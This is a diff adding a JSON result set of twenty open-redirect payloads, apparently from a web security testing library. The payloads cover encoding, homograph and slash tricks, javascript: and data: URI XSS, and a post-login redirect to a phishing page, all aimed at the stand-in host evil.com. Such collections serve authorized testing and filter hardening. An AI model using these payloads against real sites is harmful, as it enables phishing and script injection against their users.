@@ -1,0 +1,349 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "redirect"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "10798c62f9e5d459",
+      "payload": "https://evil.com?legitimate.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query confusion. Redirects to evil.com with query.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "param",
+        "query"
+      ]
+    },
+    {
+      "id": "1ab649f0a91b6253",
+      "payload": "https://evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Redirect via header (Host, X-Forwarded-Host). Check if response Location header reflects.",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "host",
+        "location"
+      ]
+    },
+    {
+      "id": "1ee0c8b118fb7881",
+      "payload": "https://legitimate.com%00.evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "null_byte",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Null byte domain truncation attempt.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "null_byte",
+        "param"
+      ]
+    },
+    {
+      "id": "27fd5d2cde42dd19",
+      "payload": "https://evil。com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "unicode",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Unicode ideographic full stop (U+3002) instead of dot. Some URL parsers normalize this to evil.com. Bypasses domain allowlist string matching.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "idn",
+        "param",
+        "unicode"
+      ]
+    },
+    {
+      "id": "38dac8bb478e5e39",
+      "payload": "https://evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Redirect URL in JSON body (e.g., callback_url, return_url field).",
+      "source": "ensphere",
+      "tags": [
+        "callback",
+        "json"
+      ]
+    },
+    {
+      "id": "48327efd59300e39",
+      "payload": "https%253A%252F%252Fevil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "double_url",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Double URL-encoded. Bypasses single-decode validation.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "double_encoded",
+        "param"
+      ]
+    },
+    {
+      "id": "48c122f692b6272b",
+      "payload": "https://evil.com/phishing",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Post-login redirect parameter. After auth, user redirected to phishing page.",
+      "source": "ensphere",
+      "tags": [
+        "param",
+        "phishing",
+        "post_login"
+      ]
+    },
+    {
+      "id": "5b27edcfc969afb2",
+      "payload": "//evil.com",
+      "technique": "open_redirect_path",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Protocol-relative redirect via path. e.g., /redirect//evil.com",
+      "source": "ensphere",
+      "tags": [
+        "path",
+        "protocol_relative"
+      ]
+    },
+    {
+      "id": "7a74d94e37d2804a",
+      "payload": "https://evil.com#legitimate.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Fragment confusion. Redirects to evil.com with fragment.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "fragment",
+        "param"
+      ]
+    },
+    {
+      "id": "8eb21d5c9c8c7e62",
+      "payload": "https://evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct external URL in redirect parameter (url=, next=, redirect=, return=).",
+      "source": "ensphere",
+      "tags": [
+        "basic",
+        "direct",
+        "param"
+      ]
+    },
+    {
+      "id": "9a799ec10bdf8eb9",
+      "payload": "evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Host header override. If app uses Host header for redirect URL generation.",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "host_override"
+      ]
+    },
+    {
+      "id": "9dd92817f8f0f463",
+      "payload": "data:text/html,\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Data URI in redirect. XSS via redirect.",
+      "source": "ensphere",
+      "tags": [
+        "data_uri",
+        "param",
+        "xss"
+      ]
+    },
+    {
+      "id": "9f49b412596f9562",
+      "payload": "https://evіl.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "unicode",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Cyrillic 'і' (U+0456) instead of Latin 'i'. IDN homograph attack — visually identical domain that resolves differently. Tests if allowlist checks compare decoded Unicode.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "homograph",
+        "idn",
+        "param"
+      ]
+    },
+    {
+      "id": "a23d10db39a6bb3c",
+      "payload": "////evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Quad-slash. Additional slashes may be collapsed by URL normalization, resulting in //evil.com redirect.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "multi_slash",
+        "param"
+      ]
+    },
+    {
+      "id": "b0050678e912f1f5",
+      "payload": "https://legitimate.com.evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Subdomain confusion. Requires attacker-controlled domain.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "param",
+        "subdomain"
+      ]
+    },
+    {
+      "id": "b0313a52911b73b3",
+      "payload": "///evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Triple-slash. Some browsers and frameworks resolve ///evil.com as protocol-relative to evil.com. Bypasses filters checking for exactly //.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "param",
+        "triple_slash"
+      ]
+    },
+    {
+      "id": "c24fc90f3e413399",
+      "payload": "%2F%2Fevil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded protocol-relative redirect.",
+      "source": "ensphere",
+      "tags": [
+        "param",
+        "protocol_relative",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "c5bfd46d30f5fa73",
+      "payload": "javascript:alert(document.domain)",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "JavaScript URI in redirect parameter. XSS via redirect.",
+      "source": "ensphere",
+      "tags": [
+        "javascript_uri",
+        "param",
+        "xss"
+      ]
+    },
+    {
+      "id": "c64e765a95aa8bd5",
+      "payload": " https://evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Leading space. Some URL validators strip spaces before checking.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "param",
+        "whitespace"
+      ]
+    },
+    {
+      "id": "c73d7bfc5eabbbef",
+      "payload": "/\\evil.com",
+      "technique": "open_redirect_param",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Backslash after slash. Some parsers treat as //evil.com.",
+      "source": "ensphere",
+      "tags": [
+        "backslash",
+        "bypass",
+        "param"
+      ]
+    }
+  ]
+}
